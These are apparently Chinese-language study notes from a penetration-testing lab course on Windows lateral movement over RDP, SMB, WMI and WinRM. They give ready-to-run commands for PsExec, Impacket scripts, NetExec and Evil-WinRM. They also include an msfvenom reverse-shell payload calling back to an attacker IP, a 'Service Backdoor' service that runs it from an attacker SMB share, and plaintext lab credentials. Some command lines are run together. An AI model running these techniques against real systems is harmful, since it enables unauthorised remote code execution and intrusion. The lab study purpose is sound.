+<p>判断：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DisableRestrictedAdmin = 0    开启受限管理模式DisableRestrictedAdmin = 1    禁用受限管理模式没有该值    通常按未显式开启处理</span><br></pre></td></tr></table></figure>
+<p>PowerShell 写法：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ItemProperty -Path &quot;HKLM:\SYSTEM\CurrentControlSet\Control\Lsa&quot; -Name DisableRestrictedAdmin</span><br></pre></td></tr></table></figure></p>
+<h4 id="远程验证"><a href="#远程验证" class="headerlink" title="远程验证"></a>远程验证</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">成功：</span><br><span class="line">    说明目标大概率开启了受限管理模式，并且该账户有 RDP 权限。</span><br><span class="line"></span><br><span class="line">失败：</span><br><span class="line">    不能直接说明没开受限管理模式。</span><br><span class="line">    还需要排查账号权限、hash 是否正确、RDP 是否开放、防火墙、NLA、域名解析等问题。</span><br></pre></td></tr></table></figure>
+<h2 id="针对低延迟网络或代理连接优化-xfreerdp-1"><a href="#针对低延迟网络或代理连接优化-xfreerdp-1" class="headerlink" title="针对低延迟网络或代理连接优化 xfreerdp"></a>针对低延迟网络或代理连接优化 xfreerdp</h2><p>如果您通过代理或在网络连接较慢的情况下使用 <strong>xfreerdp</strong>，我们可以通过使用以下附加选项来提高会话速度：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xfreerdp /u:Helen /p:&#x27;RedRiot88&#x27; /d:inlanefreight.local /v:10.129.229.244/dynamic-resolution /drive:.,linux /bpp:8 /compression -themes -wallpaper/clipboard /audio-mode:0 /auto-reconnect -glyph-cache</span><br></pre></td></tr></table></figure>
+<p>在该命令中：</p>
+<ul>
+<li><strong>/bpp:8</strong>：将色深降低至每像素 8 位，从而减少传输的数据量。</li>
+<li><strong>/compression</strong>：启用压缩以减少通过网络发送的数据量。</li>
+<li><strong>-themes</strong>：禁用桌面主题以减少图形数据。</li>
+<li><strong>-wallpaper</strong>：禁用桌面壁纸以进一步减少图形数据。</li>
+<li><strong>/clipboard</strong>：启用本地计算机与远程计算机之间的剪贴板共享。</li>
+<li><strong>/audio-mode:0</strong>：禁用音频重定向以节省带宽。</li>
+<li><strong>/auto-reconnect</strong>：如果连接中断则自动重新连接，从而提高会话稳定性。</li>
+<li><strong>-glyph-cache</strong>：启用字形（文本字符）缓存，以减少文本渲染时发送的数据量。</li>
+</ul>
+<p>使用这些选项有助于优化 RDP 会话的性能，确保即使在不理想的网络条件下也能获得更流畅的体验。</p>
+<h1 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h1><p>smb是一种网络通信协议，旨在促进网络内计算机之间共享文件、打印机和其他资源</p>
+<h2 id="权限-1"><a href="#权限-1" class="headerlink" title="权限"></a>权限</h2><p>为了成功进行<code>smb</code>横向移动，我们需要一个属于目标计算机管理组的账户。</p>
+<h3 id="UAC远程限制"><a href="#UAC远程限制" class="headerlink" title="UAC远程限制"></a>UAC远程限制</h3><p>UAC 可能会阻止我们实现远程代码执行，但了解这些限制对于在应对不同版本 Windows 上的 UAC 限制时有效利用这些工具至关重要。这些限制意味着几个关键点：</p>
+<ul>
+<li>需要本地管理员权限。</li>
+<li>非 RID 500 的本地管理员账户无法在以下系统上运行诸如 PsExec 之类的工具：Windows Vista 及更高版本。</li>
+<li>在机器上拥有管理员权限的域用户可以执行诸如 PsExec 之类的工具。</li>
+<li>RID 500 本地管理员账户可以在机器上利用诸如 PsExec 之类的工具。</li>
+</ul>
+<h3 id="SMB-命名管道"><a href="#SMB-命名管道" class="headerlink" title="SMB 命名管道"></a>SMB 命名管道</h3><p>SMB 中的命名管道通过 TCP 445 端口的 IPC$ 共享进行访问，对于网络内的横向移动至关重要。它们支持从 NULL 会话上下文到需要本地管理员权限的一系列操作。例如，<code>svcctl</code> 为远程操作提供了便利。</p>
+<p>服务的创建、启动和停止以及执行命令，正如在 Impacket 的 <code>psexec.py</code> 和 <code>smbexec.py</code> 等工具中所见。</p>
+<p><code>atsvc</code> 支持远程创建用于执行命令的计划任务，被 Impacket 的 <code>atexec.py</code> 所利用。这些命名管道对于有效执行和管理横向移动操作至关重要。</p>
+<p><code>winreg</code> 提供对 Windows 注册表的远程访问，允许查询和修改注册表键值，有助于恶意负载的持久化和配置。</p>
+<h2 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h2><p>我们需要对目标主机进行端口扫描，已验证SMB是否在目标上运行</p>
+<h2 id="Windows进行横向移动"><a href="#Windows进行横向移动" class="headerlink" title="Windows进行横向移动"></a><code>Windows</code>进行横向移动</h2><h3 id="PsExec"><a href="#PsExec" class="headerlink" title="PsExec"></a>PsExec</h3><p><strong>PsExec</strong> 包含在微软的 <strong>Sysinternals 套件</strong> 中，该套件是专为协助管理员执行系统管理任务而设计的一系列工具。此工具通过使用 <strong>SMB 协议的命名管道</strong> 来促进远程命令执行并检索输出，运行在 <strong>TCP 端口 445</strong> 和 <strong>TCP 端口 139</strong> 上。</p>
+<p>默认情况下，<strong>PSExec</strong> 执行以下操作：</p>
+<ol>
+<li>通过 <strong>SMB</strong> 建立到隐藏 <strong>ADMIN$</strong> 共享的链接，该共享对应于远程系统上的 <code>C:\Windows</code> 目录。</li>
+<li>使用服务控制管理器 <strong>SCM</strong> 启动 <strong>PsExecsvc</strong> 服务，并在远程系统上建立命名管道。</li>
+<li>通过创建的命名管道重定向控制台的输入和输出，以执行交互式命令。</li>
+</ol>
+<p><strong>注意</strong>：PsExec 消除了双跳问题，因为凭据随命令一起传递，并生成交互式登录会话（类型 2）。</p>
+<p>我们可以使用 <strong>PsExec</strong> 连接到远程主机并以交互方式执行命令。我们必须指定要连接的计算机或目标 <code>\\SRV02</code>、用于交互式 shell 的选项 <code>-i</code>、使用选项 <code>-u &lt;user&gt;</code> 指定的管理员登录凭据和密码 <code>-p &lt;password&gt;</code>，以及用于指定要执行的应用程序的 <code>cmd</code>：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\PsExec.exe \\SRV02 -i -u INLANEFREIGHT\helen -p RedRiot88 cmd</span><br></pre></td></tr></table></figure></p>
+<h3 id="SharpNoPSExec"><a href="#SharpNoPSExec" class="headerlink" title="SharpNoPSExec"></a><code>SharpNoPSExec</code></h3><p>SharpNoPSExec 是一个 C# 编写的无文件横向移动/远程命令执行工具。</p>
+<p>执行逻辑：</p>
+<pre><code>1. 连接目标机器的服务控制管理器 SCM。
+2. 查询目标机器上的服务。
+3. 选择一个已停止、手动/禁用启动、LocalSystem 权限的服务。
+4. 保存该服务原始配置。
+5. 将服务 binPath 临时修改为攻击者指定的 payload。
+6. 启动服务，使 payload 在目标机器上执行。
+7. 执行后恢复服务原配置。
+</code></pre><p>本质：<br>    SCM 服务滥用 + 远程命令执行 + 横向移动</p>
+<p>特点：<br>    不像 PsExec 那样创建新的 PSEXESVC 服务。<br>    不需要上传服务二进制文件到目标磁盘。<br>    适合执行一条命令或触发反连 payload。</p>
+<p>如果 payload 是普通命令：<br>    它就是远程命令执行工具。</p>
+<p>如果 payload 是 reverse shell：<br>    它就表现为反弹 shell 工具。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\SharpNoPSExec.exe --target=172.20.0.52 --payload=&quot;c:\windows\system32\cmd.exe /c powershell -exec bypass -nop -e &lt;base64&gt;&quot;</span><br></pre></td></tr></table></figure>
+<h3 id="NimExec"><a href="#NimExec" class="headerlink" title="NimExec"></a><code>NimExec</code></h3><h2 id="Linux进行横向移动"><a href="#Linux进行横向移动" class="headerlink" title="Linux进行横向移动"></a><code>Linux</code>进行横向移动</h2><h3 id="Psexec-py"><a href="#Psexec-py" class="headerlink" title="Psexec.py"></a><code>Psexec.py</code></h3><p><strong>Psexec.py</strong> 是 Linux 用户的一个绝佳替代方案。这种方法与 SysInternals 套件中传统的 <strong>PsExec</strong> 工具非常相似。</p>
+<p>它通过将一个随机名称的可执行文件上传到目标 Windows 机器上的 <strong>ADMIN$</strong> 共享来创建一个远程服务。然后，它通过 <strong>RPC</strong> 和 <strong>Windows 服务控制管理器</strong> 注册该服务。一旦注册成功，该工具就会通过命名管道建立通信，从而允许在远程系统上执行命令并检索输出。理解这一机制对于有效利用该工具并认识其在促进远程命令执行中的作用至关重要。</p>
+<p>我们可以使用 <strong>psexec.py</strong> 在目标主机上实现远程代码执行，这需要管理员登录凭据。我们必须提供域名、管理员级用户、密码以及目标 IP，类似于：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q psexec.py INLANEFREIGHT/helen:&#x27;RedRiot88&#x27;@172.20.0.52</span><br></pre></td></tr></table></figure></p>
+<h3 id="smbexec-py"><a href="#smbexec-py" class="headerlink" title="smbexec.py"></a><code>smbexec.py</code></h3><p>使用 <strong>smbexec.py</strong> 方法可以利用 Windows 内置的 SMB 功能在远程系统上运行任意命令，而无需上传文件，这使其成为一种更隐蔽的替代方案。</p>
+<p>通信完全通过 <strong>TCP 端口 445</strong> 进行。它还会建立一个服务，且仅为此使用 <strong>MSRPC</strong>，并通过 <strong>svcctl SMB 管道</strong>管理该服务。</p>
+<p>要使用此工具，我们必须提供域名、管理员用户、密码以及目标 IP 地址：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q smbexec.py INLANEFREIGHT/helen:&#x27;RedRiot88&#x27;@172.20.0.52</span><br></pre></td></tr></table></figure>
+<h3 id="services-py"><a href="#services-py" class="headerlink" title="services.py"></a>services.py</h3><p>Impacket 中的 <strong>services.py</strong> 脚本通过 <strong>MSRPC</strong> 接口与 Windows 服务进行交互。它支持启动、停止、删除、读取状态、配置、列举、创建和修改服务。</p>
+<p>在红队任务期间，通过获取目标机器服务的访问权限，可以大大简化许多任务。此技术是<strong>非交互式</strong>的，这意味着我们无法实时查看操作结果。</p>
+<hr>
+<h4 id="查看目标主机服务列表"><a href="#查看目标主机服务列表" class="headerlink" title="查看目标主机服务列表"></a>查看目标主机服务列表</h4><p>在提供域名、管理员账号、密码和目标 IP 地址后，我们可以通过输入命令 <code>list</code> 来查看目标主机中的服务列表。</p>
+<p>格式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;</span><br></pre></td></tr></table></figure>
+<p>示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q services.py INLANEFREIGHT/helen:&#x27;RedRiot88&#x27;@172.20.0.52list</span><br></pre></td></tr></table></figure>
+<hr>
+<h4 id="使用-services-py-进行横向移动"><a href="#使用-services-py-进行横向移动" class="headerlink" title="使用 services.py 进行横向移动"></a>使用 services.py 进行横向移动</h4><p>要使用此工具进行横向移动，我们可以：</p>
+<ol>
+<li>建立一个新服务</li>
+<li>修改现有服务</li>
+<li>定义自定义命令以获取反向 Shell</li>
+</ol>
+<p>创建新服务时，不再使用 <code>list</code>，而是使用 <code>create</code>，并指定以下参数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-name &lt;serviceName&gt;      指定服务名称</span><br><span class="line">-display &lt;displayName&gt;  指定显示名称</span><br><span class="line">-path &lt;command/path&gt;     指定要执行的命令或程序路径</span><br></pre></td></tr></table></figure>
+<h4 id="生成Payload"><a href="#生成Payload" class="headerlink" title="生成Payload"></a>生成Payload</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.207 LPORT=9001 -f exe-service -o rshell-9001s.exe</span><br></pre></td></tr></table></figure>
+<h4 id="创建新服务"><a href="#创建新服务" class="headerlink" title="创建新服务"></a>创建新服务</h4><p>先启动smb共享<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo smbserver.py share -smb2support ./</span><br></pre></td></tr></table></figure><br>现在可以执行命令来创建一个新服务：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q services.py INLANEFREIGHT/helen:&#x27;RedRiot88&#x27;@172.20.0.52 create -name &#x27;Service Backdoor&#x27; -display &#x27;Service Backdoor&#x27; -path &quot;\\\\10.10.14.207\\share\\rshell-9001.exe&quot;</span><br></pre></td></tr></table></figure>
+<p>含义：<br>create<br>    创建服务。<br>-name ‘Service Backdoor’<br>    指定服务名称。<br>-display ‘Service Backdoor’<br>    指定服务显示名称。<br>-path “\\10.10.14.207\share\rshell-9001.exe”<br>    指定服务启动时要执行的程序路径。</p>
+<h3 id="atexec-py"><a href="#atexec-py" class="headerlink" title="atexec.py"></a>atexec.py</h3><p><code>atexec.py</code> 是 Impacket 中用于远程命令执行的脚本。它利用 Windows 的<strong>任务计划程序服务</strong>，该服务可以通过 <strong>atsvc SMB 命名管道</strong>访问。</p>
+<p>它的核心作用是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">远程向目标主机添加计划任务        </span><br><span class="line">    ↓</span><br><span class="line">让计划任务在指定时间执行命令        </span><br><span class="line">    ↓</span><br><span class="line">通过 SMB 取回命令输出</span><br></pre></td></tr></table></figure>
+<hr>
+<h4 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h4><p><code>atexec.py</code> 会通过 SMB/RPC 与目标主机的任务计划程序交互，在远程主机上创建一个计划任务，使该任务在指定时间执行命令。</p>
+<p>命令输出会被写入到目标主机上的一个文件中，随后通过 <strong>ADMIN$</strong> 共享读取回来。</p>
+<p>因此，使用该工具时有一个重要要求：攻击机和目标 PC 的时间需要同步到同一分钟。</p>
+<p>如果时间差太大，计划任务可能不会按预期执行。</p>
+<hr>
+<h4 id="基本要求"><a href="#基本要求" class="headerlink" title="基本要求"></a>基本要求</h4><p>使用 <code>atexec.py</code> 通常需要：</p>
+<ol>
+<li>目标开放 SMB，通常是 TCP 445。</li>
+<li>拥有目标主机的管理员权限。</li>
+<li>提供域名、管理员用户、密码和目标 IP。</li>
+<li>攻击机与目标机时间尽量保持同步。</li>
+</ol>
+<p>认证格式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;</span><br></pre></td></tr></table></figure>
+<hr>
+<h4 id="启动监听器"><a href="#启动监听器" class="headerlink" title="启动监听器"></a>启动监听器</h4><p>在攻击机上先启动一个监听器，用于接收反向 Shell：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lnvp 8080</span><br></pre></td></tr></table></figure>
+<p>输出示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Listening on 0.0.0.0 8080</span><br></pre></td></tr></table></figure>
+<hr>
+<h4 id="使用-atexec-py-执行反向-Shell-载荷"><a href="#使用-atexec-py-执行反向-Shell-载荷" class="headerlink" title="使用 atexec.py 执行反向 Shell 载荷"></a>使用 atexec.py 执行反向 Shell 载荷</h4><p>示例命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q atexec.py INLANEFREIGHT/helen:&#x27;RedRiot88&#x27;@172.20.0.52 &quot;powershell -e ...SNIP...AbwBzAGUAKAApAA==&quot;</span><br></pre></td></tr></table></figure>
+<p>参数说明：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q    通过代理链执行命令，并静默输出 proxychains 信息。</span><br><span class="line">atexec.py    使用 Impacket 的 atexec 模块。</span><br><span class="line">INLANEFREIGHT/helen:&#x27;RedRiot88&#x27;@172.20.0.52    使用 INLANEFREIGHT 域中的 helen 用户连接目标 172.20.0.52。</span><br><span class="line">&quot;powershell -e ...&quot;    在目标主机上通过 PowerShell 执行 Base64 编码后的命令。</span><br></pre></td></tr></table></figure>
+<p>其中：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-e</span><br></pre></td></tr></table></figure>
+<p>是 PowerShell 的 <code>-EncodedCommand</code> 缩写，表示后面跟的是 Base64 编码后的 PowerShell 命令。</p>
+<hr>
+<h4 id="成功获取反向-Shell"><a href="#成功获取反向-Shell" class="headerlink" title="成功获取反向 Shell"></a>成功获取反向 Shell</h4><p>当目标主机执行载荷后，攻击机监听器会收到连接：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -lnvp 8080Listening on 0.0.0.0 8080```</span><br><span class="line"></span><br><span class="line">说明已经成功在攻击机上建立了来自目标主机的反向 Shell。</span><br></pre></td></tr></table></figure>
+<h1 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h1><p>WMI是一项强大的Windows功能，提供了一种标准化的方式来与系统管理信息进行交互，并在网络环境中管理设备与应用设备</p>
+<p>主要通过135端口进行出示连接，并使用<code>49152-65536</code>范围内动态分配端口进行后续数据交换</p>
+<h2 id="权限-2"><a href="#权限-2" class="headerlink" title="权限"></a>权限</h2><p>为了在网络中优先利用WMI来进行横向移动，在目标系统上拥有必要的权限至关重要。通常需要管理员权限，但是，经过特定配置允许，是可以通过较低权限访问的</p>
+<h2 id="枚举-1"><a href="#枚举-1" class="headerlink" title="枚举"></a>枚举</h2><p>在使用WMI进行横向移动之前，确定哪些系统已启动并且可以访问WMI是至关重要的。</p>
+<p>对于WMI测试凭据，我们可以使用Netexec<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec wmi &lt;IP&gt; -u &lt;用户&gt; -p &lt;密码&gt;</span><br></pre></td></tr></table></figure><br>默认情况下只用管理员才能使用WMI远程执行操作</p>
+<h2 id="Windows横向移动"><a href="#Windows横向移动" class="headerlink" title="Windows横向移动"></a>Windows横向移动</h2><h3 id="wmic"><a href="#wmic" class="headerlink" title="wmic"></a><code>wmic</code></h3><p>在windows上，我们可以使用<code>wmic</code>和powershell与wmi进行交互。wmi是一种命令行界面，允许管理员查询和管理Windows操作系统</p>
+<h2 id="Linux横向移动"><a href="#Linux横向移动" class="headerlink" title="Linux横向移动"></a>Linux横向移动</h2><h3 id="wmiexec"><a href="#wmiexec" class="headerlink" title="wmiexec"></a><code>wmiexec</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;target-ip&gt; &lt;command&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="NetExec"><a href="#NetExec" class="headerlink" title="NetExec"></a><code>NetExec</code></h3><p>我们也可以使用<code>NetExec</code>来运行WMI查询<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains netexec wmi &lt;ip&gt; -u &lt;user&gt; -p &lt;password&gt; --wmi &quot;&lt;查询语句&gt;&quot;</span><br></pre></td></tr></table></figure></p>
+<p>也可以执行命令<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychain netexec wmi &lt;ip&gt; -u &lt;user&gt; -p &lt;password&gt; -x &lt;command&gt;</span><br></pre></td></tr></table></figure></p>
+<h2 id="WinRM"><a href="#WinRM" class="headerlink" title="WinRM"></a>WinRM</h2><p><strong>Windows 远程管理（WinRM）</strong> 是微软版本的 <strong>WS-Management（Web Services-Management）</strong> 协议，这是一种用于远程管理软件和硬件的标准协议。WinRM 促进了计算机之间管理数据的传输，使管理员能够执行各种任务，例如运行脚本和从远程系统检索事件数据。</p>
+<p>WinRM 通常与 <strong>PowerShell</strong> 结合使用，用于自动化和管理目的，使其成为管理 Windows 环境不可或缺的工具。它提供了一种安全且高效的方法与远程系统进行交互，利用成熟的网络标准来确保兼容性和灵活性。WinRM 通信主要使用 <strong>TCP 端口 5985（HTTP）</strong> 和 <strong>5986（HTTPS）</strong>。</p>
+<p>在横向移动的语境下，作为渗透测试人员，我们利用微软为远程管理构建的固有机制。我们无需发明新方法，而是可以滥用这些原生功能来执行任意命令或获取对其他系统的访问权限。这种方法与管理员合法管理远程计算机的方式是一致的。</p>
+<h2 id="WinRm权限"><a href="#WinRm权限" class="headerlink" title="WinRm权限"></a>WinRm权限</h2><p>要利用 <strong>WinRM</strong> 进行横向移动，目标系统上需要特定的权限。虽然通常需要管理员权限，但也可以授予非管理员账户使用 WinRM 所需的权限。</p>
+<p>默认情况下，<strong>Remote Management Users</strong> 组的成员拥有必要的访问权限。此外，某些配置和策略也可以向其他用户授予 WinRM 访问权限。</p>
+<hr>
+<p>识别拥有 WinRM 使用权限的用户涉及检查组策略、组成员身份以及测试凭据：</p>
+<ul>
+<li><strong>Remote Management Users Group</strong>：该组的成员天生拥有使用 WinRM 所需的权限。</li>
+<li><strong>Group Policies</strong>：审查可能向特定用户授予 WinRM 访问权限的组策略。</li>
+<li><strong>Testing Credentials</strong>：测试各种凭据是否可以通过 WinRM 成功连接，使用不同的工具来验证其有效性和访问权限。</li>
+<li><strong>Active Directory（AD）</strong>：我们可以使用 BloodHound 或 LDAP 查询等工具来查找具有 WinRM 权限的用户。</li>
+</ul>
+<h2 id="WinRM-枚举"><a href="#WinRM-枚举" class="headerlink" title="WinRM 枚举"></a>WinRM 枚举</h2><p>在使用 WinRM 进行横向移动之前，必须确定哪些系统已启用并可访问 WinRM。可以使用各种工具和脚本进行枚举以识别目标。</p>
+<p>我们可以使用<code>nmap</code>来查看是否有winRm端口</p>
+<h2 id="Windows横向移动-1"><a href="#Windows横向移动-1" class="headerlink" title="Windows横向移动"></a><code>Windows</code>横向移动</h2><p>首先先查询自身的凭证<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Command -computername &lt;计算机名&gt; -Scriptblock&#123; hostname;whoami &#125;</span><br></pre></td></tr></table></figure></p>
+<h3 id="WinRS"><a href="#WinRS" class="headerlink" title="WinRS"></a><code>WinRS</code></h3><p><strong>winrs（Windows Remote Shell）</strong> 是一个命令行工具，允许通过 <strong>WinRM</strong> 远程在 Windows 机器上执行命令。</p>
+<p>以下是使用 <code>winrs</code> 在远程服务器上执行命令的示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs -r:srv02 &quot;powershell -c whoami;hostname&quot;</span><br></pre></td></tr></table></figure>
+<h4 id="使用显式凭据执行命令"><a href="#使用显式凭据执行命令" class="headerlink" title="使用显式凭据执行命令"></a>使用显式凭据执行命令</h4><p><code>winrs</code> 还允许通过 <code>/username</code> 和 <code>/password</code> 选项使用显式凭据：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs /remote:srv02 /username:helen /password:RedRiot88 &quot;powershell -c whoami;hostname&quot;</span><br></pre></td></tr></table></figure>
+<p>输出示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">inlanefreight\helen</span><br><span class="line">SRV02</span><br></pre></td></tr></table></figure>
+<h4 id="复制文件"><a href="#复制文件" class="headerlink" title="复制文件"></a>复制文件</h4><p>PowerShell 提供了在系统之间复制文件的功能，这在横向移动过程中很有用。</p>
+<p>实现方式之一是通过 <strong>WinRM</strong> 使用 <strong>PowerShell 远程会话</strong>。这种方法允许在远程系统之间进行安全且高效的文件传输。</p>
+<h5 id="创建远程-PowerShell-会话"><a href="#创建远程-PowerShell-会话" class="headerlink" title="创建远程 PowerShell 会话"></a>创建远程 PowerShell 会话</h5><p>要使用 PowerShell 会话复制文件，首先需要与目标机器建立远程会话。可以使用 <code>New-PSSession</code> cmdlet。</p>
+<p>示例：创建一个变量，并将其命名为 <code>$sessionSRV02</code>：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sessionSRV02 = New-PSSession -ComputerName SRV02 -Credential $credential</span><br></pre></td></tr></table></figure></p>
+<h5 id="从本机复制文件到远程主机"><a href="#从本机复制文件到远程主机" class="headerlink" title="从本机复制文件到远程主机"></a>从本机复制文件到远程主机</h5><p>建立会话后，可以使用 <code>Copy-Item</code> cmdlet 将文件复制到目标机器。</p>
+<p>要将当前机器 <strong>SRV01</strong> 中的文件复制到目标机器 <strong>SRV02</strong>，可以使用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Copy-Item -ToSession $sessionSRV02 -Path &#x27;C:\Users\helen\Desktop\Sample.txt&#x27; -Destination &#x27;C:\Users\helen\Desktop\Sample.txt&#x27; -Verbose</span><br></pre></td></tr></table></figure>
+<h5 id="从远程主机复制文件到本地"><a href="#从远程主机复制文件到本地" class="headerlink" title="从远程主机复制文件到本地"></a>从远程主机复制文件到本地</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Copy-Item -FromSession $sessionSRV02 -Path &#x27;C:\Users\helen\Desktop\Sample.txt&#x27; -Destination &#x27;C:\Users\helen\Desktop\Sample.txt&#x27; -Verbose</span><br></pre></td></tr></table></figure>
+<h4 id="交互式Shell"><a href="#交互式Shell" class="headerlink" title="交互式Shell"></a>交互式<code>Shell</code></h4><p>我们可以使用 <strong>Enter-PSSession</strong> cmdlet 通过 <strong>PowerShell 远程管理</strong>来获取交互式 shell。</p>
+<p>该 cmdlet 允许我们启动与远程计算机的交互式会话，无论是通过使用 <strong>New-PSSession</strong> 创建的会话、指定明确的凭据，还是利用执行命令的当前会话。</p>
+<p>例如，让我们重用之前创建的变量。指定 <code>Enter-PSSession</code> 和该变量将为我们提供远程计算机上的交互式 PowerShell 提示符，使我们能够像直接登录一样执行命令。<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Enter-PSSession $sessionSRV02</span><br></pre></td></tr></table></figure></p>
+<h2 id="Linux横向移动-1"><a href="#Linux横向移动-1" class="headerlink" title="Linux横向移动"></a><code>Linux</code>横向移动</h2><h3 id="NetExec-1"><a href="#NetExec-1" class="headerlink" title="NetExec"></a><code>NetExec</code></h3><p>我们可以使用<code>-x</code>或者<code>-X</code>来执行命令<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec winrm &lt;ip&gt; -u &lt;user&gt; -p &lt;password&gt; -x &#x27;&lt;command&gt;&#x27;</span><br></pre></td></tr></table></figure></p>
+<h3 id="Evil-WinRM"><a href="#Evil-WinRM" class="headerlink" title="Evil-WinRM"></a><code>Evil-WinRM</code></h3><p>这是一款基于Ruby的工具。<br>安装完成以后，可以远程连接机器并执行命令<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i &lt;ip&gt; -u &#x27;&lt;domain\username&gt;&#x27; -p &lt;password&gt;</span><br></pre></td></tr></table></figure><br>可以使用<code>menu</code>来看有哪些能力</p>
+<h4 id="导入脚本"><a href="#导入脚本" class="headerlink" title="导入脚本"></a>导入脚本</h4><p><code>Evil-Winrm</code>允许我们加载PS脚本<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i &lt;IP&gt; -u &#x27;&lt;domain&gt;\&lt;username&gt;&#x27; -p &lt;password&gt; -s &#x27;/home/plaintext&#x27;</span><br></pre></td></tr></table></figure><br>在伤处命令中，我们建立了一个会话并调用powerview.ps1，因为其位于/home/plaintext中</p>
